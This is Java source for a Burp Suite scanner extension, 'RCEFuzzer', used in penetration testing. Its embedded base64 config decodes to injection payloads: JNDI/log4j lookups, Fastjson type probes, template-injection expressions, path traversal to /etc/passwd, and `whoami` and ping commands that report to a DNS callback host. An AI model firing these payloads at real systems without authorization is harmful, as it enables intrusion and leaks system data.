package burp;

import commmon.CommonUtils;
import commmon.Tweb;
import commmon.YamlTools;
import core.Config;
import core.FakeRedis;
import core.UrlNormalizer;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.regex.Pattern;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import modules.HeaderPollution;
import modules.JsonPollution;
import modules.ParamPollution;
import modules.SsrfPollution;

public class BurpExtender implements IBurpExtender, IScannerCheck, IContextMenuFactory {
  public static final String NAME = "RCEFuzzer";
  
  public static final String VERSION = "0.5.1";
  
  public static IBurpExtenderCallbacks callbacks;
  
  public static IExtensionHelpers helpers;
  
  public static PrintWriter stdout;
  
  public static PrintWriter stderr;
  
  public static BurpExtender burpExtender;
  
  public static FakeRedis fakeRedis = new FakeRedis();
  
  public static String config = "CiMjIwojCiMg6YWN572u6K+05piOOgojICAgIDEudHdlYueahOmFjee9ruaYr+W/hemhu+imgeaUueeahCwg5LiN5pS55pi+56S65LiN5LqG5ryP5rSeCiMgICAgMi7nmb3lkI3ljZXnmoTkvJjlhYjnuqfmmK/pq5jkuo7pu5HlkI3ljZXnmoQKIyAgICAzLuaJgOaciemFjee9rumDveaYr+WPr+S7peWKqOaAgeaUueeahCwg5LiN55So6YeN5paw5Yqg6L295o+S5Lu2CiMg5L2/55So6K+05piOOgojICAgIGh0dHBzOi8vd3d3LndvbGFpLmNvbS9nUzVVV2dNbUhHNHluSlFnekwzQVlrCiMjIwpjb25maWc6CiAgdmVyc2lvbjogfCAgIyDmj5Lku7bniYjmnKwKICAgIDAuNS4xCiAgZG5zbG9nVHlwZToKICAgIGNhbGxiYWNrCiAgZG5zbG9nRG9tYWluOiB8ICMgdHdlYiDlrZDln5/lkI3phY3nva4KICAgIGNhbGxiYWNrLnJlZAogIGRuc2xvZ0FwaUtleTogfCAgIyB0d2ViIGFwaemFjee9riDlhbbkuK1LRVnkuLrlsZXkvY3nrKYs5Zyo5paw5pen54mI5pys55qEdHdlYuWdh+WPr+WcqFByb2ZpbGXpobXpnaLmib7liLAKICAgIHh4eHh4eHgKICB0aW1lb3V0OiB8ICAjIOaJq+aPj+i/h+eoi+S4reeahOi2heaXtumFjee9riDpnZ50d2Vi6K+35rGC6LaF5pe26K6+572uIOWNleS9jeavq+enkiA2MDAwMOS4ujYw56eSCiAgICA2MDAwMAogIGhvc3RCbGFja2xpc3RSZWc6IHwgICMg56aB5q2i5omr5o+P55qE5Z+f5ZCN5YiX6KGoCiAgICAoLis/KShnb3ZcLmNufGVkdVwuY258dHdlYnxnb29nbGV8Z3N0YXRpYykoLis/KQogIGV4dEJsYWNrbGlzdDogfCAgIyDnpoHmraLmiavmj4/nmoTlkI7nvIDliJfooags6L+Z5LiN5piv5q2j5YiZ77yM5pys5p2l5oOz5LuOcGFzc2l2ZS1zY2FuLWNsaWVudOS4reaKhOS7o+eggeeahCznu5Pmnpzlj5HnjrDku5bmnIlidWcuLi4KICAgIC5qc3wuY3NzfC5qcGVnfC5naWZ8LmpwZ3wucG5nfC5wZGZ8LnJhcnwuemlwfC5kb2N4fC5kb2N8LmljbwoKanNvblBvbGx1dGlvbjoKICBzdGF0dXM6ICAjb27kuLrlvIDlkK8gb2Zm5Li65YWz6ZetCiAgICBvbgogIGFsbGluOiB8ICPmm7/mjaLmlbTkuKpqc29u5pWw5o2u5YyFCiAgICB7IkB0eXBlIjoiamF2YS5uZXQuSW5ldDRBZGRyZXNzIiwidmFsIjoiZG5zbG9nIn0KICB2YWx1ZTogfCAj5LuF5rGh5p+TanNvbueahOmUruWAvCDkuLrkuoZweXRob24gZXZhbOmCo+enjeaDheWGteiAg+iZkSDkuI3liqDlj4zlvJXlj7fljIXoo7nnmoTor53msaHmn5Pnu5PmnpznsbvkvLx7InRlc3QiOl9faW1wb3J0X18oJ29zJyl9IHsidGVzdCI6IntcImR0YWFcIjpfX2ltcG9ydF9fKCdvcycpfSJ9CiAgICAiJHtqbmRpOmxkYXA6Ly9kbnNsb2cvanNvbmtleX0iCiAgICBfX2ltcG9ydF9fKCdzb2NrZXQnKS5nZXRob3N0YnlhZGRyKCdkbnNsb2cnKQoKcGFyYW1Qb2xsdXRpb246CiAgc3RhdHVzOiAjb27kuLrlvIDlkK8gb2Zm5Li65YWz6ZetCiAgICBvbgogIGV4cHJzOiB8ICPkuLrkuoblhbzlrrnmnInlm57mmL7nmoTooajovr7lvI/ms6jlhaUv5Luj56CB5omn6KGM5ryP5rSeCiAgICB7ezk1MjcqMjMzM319fDIyMjI2NDkxCiAgICAke1QoamF2YS5sYW5nLlN5c3RlbSkuZ2V0ZW52KCl9fEpBVkFfSE9NRQogICAgJHtUKysrKysrKyhqYXZhLmxhbmcuU3lzdGVtKS5nZXRlbnYoKX18SkFWQV9IT01FCiAgICB7cGhwfXZhcl9kdW1wKG1kNSg5NTI3KSk7ey9waHB9fDUyNTY5YzA0NWRjMzQ4ZjEyZGZjNGM4NTAwMGFkODMyCiAgICB7aWYrdmFyX2R1bXAobWQ1KDk1MjcpKX17L2lmfXw1MjU2OWMwNDVkYzM0OGYxMmRmYzRjODUwMDBhZDgzMgogICAgLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZHxyb290CiAgdmFsdWU6IHwKICAgIGRuc2xvZwogICAgJHtqbmRpOmxkYXA6Ly9wYXJhbVBvbGx1dGlvbi5kbnNsb2cvbG9nNGp9CiAgICBgd2hvYW1pYC5kbnNsb2cKICAgIGh0dHA6Ly9kbnNsb2cvCiAgICBwaW5nKy1uYysxK2Ruc2xvZwoKaGVhZGVyUG9sbHV0aW9uOgogIHN0YXR1czogI29u5Li65byA5ZCvIG9mZuS4uuWFs+mXrQogICAgb24KICBhbGxpbjogfCAj5LiA5qyh5oCn5rGh5p+T6Zmk5LqGdXJs5ZKMaG9zdOWklueahOaJgOacieivt+axguWktAogICAgJHtqbmRpOmRuczovL2Ruc2xvZy80NTZ9CiAgICAke2puZGk6bGRhcDovL2Ruc2xvZy83ODl9CiAgaGVhZGVyczogfCAj5re75Yqg55qE6K+35rGC5aS05aaC5p6c5Y6f5pWw5o2u5YyF5pyJ5YiZ6L+95Yqg5Y6f5YC85rGh5p+TIOaXoOWImea3u+WKoOWQjuWGjeWPkeWMhSDnq5bnur985Li6a2V55ZKMdmFsdWXnmoTliIbpmpTnrKblj7fjgIIKICAgIFgtRm9yd2FyZGVkLUZvcnwke2puZGk6ZG5zOi8vZG5zbG9nLzQ1Nn0KICAgIFgtQXBpLVZlcnNpb258JHtqbmRpOmRuczovL2Ruc2xvZy80NTZ9Cgpzc3JmUG9sbHV0aW9uOgogIHN0YXR1czogI29u5Li65byA5ZCvIG9mZuS4uuWFs+mXrQogICAgb24KCnJlc3BvbnNlTWF0Y2g6CiAgc3RhdHVzOiAjb27kuLrlvIDlkK8gb2Zm5Li65YWz6ZetCiAgICBvZmYKICBleHByOiB8ICPmt7vliqDnmoTor7fmsYLlpLTlpoLmnpzljp/mlbDmja7ljIXmnInliJnopobnm5bljp/lgLzmsaHmn5Mg5peg5YiZ5re75Yqg5ZCO5YaN5Y+R5YyFCiAgICB0aGlua3BocDplcnJvcgo=";
  
  public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
    burpExtender = this;
    BurpExtender.callbacks = callbacks;
    helpers = callbacks.getHelpers();
    stdout = new PrintWriter(callbacks.getStdout(), true);
    stderr = new PrintWriter(callbacks.getStderr(), true);
    callbacks.registerScannerCheck(this);
    callbacks.registerContextMenuFactory(this);
    callbacks.setExtensionName("RCEFuzzer");
    stdout.println(String.format("%s %s was loaded...", new Object[] { "RCEFuzzer", "0.5" }));

    File file = new File(Config.YAML_PATH);
    if (!file.exists()) {
      stdout.println("init...");
      try {
        FileOutputStream f = new FileOutputStream(file);
        f.write(helpers.base64Decode(config.getBytes(StandardCharsets.UTF_8)));
        f.flush();
        f.close();
      } catch (Exception e) {
        stderr.print(e.getMessage());
      } 
    }

    Tweb.initSubDomainAndApi();

    stdout.println("\nConfig File Path: " + Config.YAML_PATH);
    stdout.println("==========================================================");
    stdout.println("   It doesn't work without modifying the config files!!!  ");
    stdout.println("==========================================================");
  }
  
  public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
    Config.requestCounts++;
    stdout.println(String.format("####################################### REQ ID: %s Start #######################################", new Object[] { Integer.valueOf(Config.requestCounts) }));
    YamlTools yaml = new YamlTools(Config.YAML_PATH);
    Config.HOST_BLACKLIST_REG = ((HashMap)yaml.getValueByKey("config", new HashMap<>())).get("hostBlacklistReg").toString().trim();
    Config.EXT_BLACKLIST = ((HashMap)yaml.getValueByKey("config", new HashMap<>())).get("extBlacklist").toString().trim();
    Config.TIMEOUT = Integer.valueOf(Integer.parseInt(((HashMap)yaml.getValueByKey("config", new HashMap<>())).get("timeout").toString().trim()));
    String host = baseRequestResponse.getHttpService().getHost();
    String fullUrl = helpers.analyzeRequest(baseRequestResponse).getUrl().toString();
    stdout.println(fullUrl);
    fullUrl = (fullUrl.indexOf("?") > 0) ? fullUrl.substring(0, fullUrl.indexOf("?")) : fullUrl;
    boolean isWhiteHostMatch = Pattern.matches(Config.HOST_WHITELIST_REG, host);
    boolean isBlackHostMatch = Pattern.matches(Config.HOST_BLACKLIST_REG, host);
    boolean isExtMatch = CommonUtils.isExtMatch(fullUrl);
    stdout.println(String.format("PASSIVESCAN STATUS: %s\t\tisWhiteHostMatch: %s\t\tisBlackHostMatch:%s\t\tisExtMatch:%s", new Object[] { Boolean.valueOf(Config.ALLOWED_PASSIVESCAN), Boolean.valueOf(isWhiteHostMatch), Boolean.valueOf(isBlackHostMatch), Boolean.valueOf(isExtMatch) }));
    boolean isNotRepeat = UrlNormalizer.isNotRepeat(baseRequestResponse);
    if (isWhiteHostMatch && Config.ALLOWED_PASSIVESCAN && 
      !isBlackHostMatch && !isExtMatch && isNotRepeat) {
      byte contentType = helpers.analyzeRequest(baseRequestResponse).getContentType();
      List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
      if (contentType == 4)
        new JsonPollution(baseRequestResponse); 
      new ParamPollution(baseRequestResponse);
      new HeaderPollution(baseRequestResponse);
      new SsrfPollution(baseRequestResponse);
    } 
    stdout.println(String.format("####################################### REQ ID: %s End   #######################################\n\n", new Object[] { Integer.valueOf(Config.requestCounts) }));
    return null;
  }
  
  public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
    return null;
  }
  
  public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
    return 0;
  }
  
  public List<JMenuItem> createMenuItems(IContextMenuInvocation iContextMenuInvocation) {
    List<JMenuItem> menus = new ArrayList<>();
    JMenuItem activeScan = new JMenuItem("activeScan");
    JMenuItem controlPanel = new JMenuItem("ControlPanel");
    JMenuItem configMenu = new JMenuItem("ScanConfig");
    final IHttpRequestResponse baseRequestResponse = iContextMenuInvocation.getSelectedMessages()[0];
    final byte contentType = helpers.analyzeRequest(baseRequestResponse).getContentType();
    activeScan.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            (new Thread(new Runnable() {
                  public void run() {
                    if (contentType == 4)
                      new JsonPollution(baseRequestResponse); 
                    new ParamPollution(baseRequestResponse);
                    new HeaderPollution(baseRequestResponse);
                    new SsrfPollution(baseRequestResponse);
                  }
                })).start();
          }
        });
    controlPanel.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent arg0) {
            Object[] options = { "OFF", "ON" };
            String status = null;
            if (!Config.ALLOWED_PASSIVESCAN) {
              status = "OFF";
            } else {
              status = "ON";
            } 
            int flag = JOptionPane.showOptionDialog(null, 
                
                String.format("PASSIVESCAN STATUS: %s\nHOST_WHITELIST_REG: %s\nHOST_BLACKLIST_REG: %s\nEXT_BLACKLIST: %s\nTIMEOUT: %sms", new Object[] { status, Config.HOST_WHITELIST_REG, Config.HOST_BLACKLIST_REG, Config.EXT_BLACKLIST, Config.TIMEOUT }), "RCEFuzzer Control Panel", 0, -1, null, options, options[options.length - 1]);
            System.out.println(flag);
            Config.ALLOWED_PASSIVESCAN = !Config.ALLOWED_PASSIVESCAN;
          }
        });
    configMenu.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent arg0) {
            String regx = JOptionPane.showInputDialog("Pls input domain regx,eg:.*?aliyun.*?", Config.HOST_WHITELIST_REG);
            Config.HOST_WHITELIST_REG = regx;
          }
        });
    menus.add(activeScan);
    menus.add(controlPanel);
    menus.add(configMenu);
    return menus;
  }
}
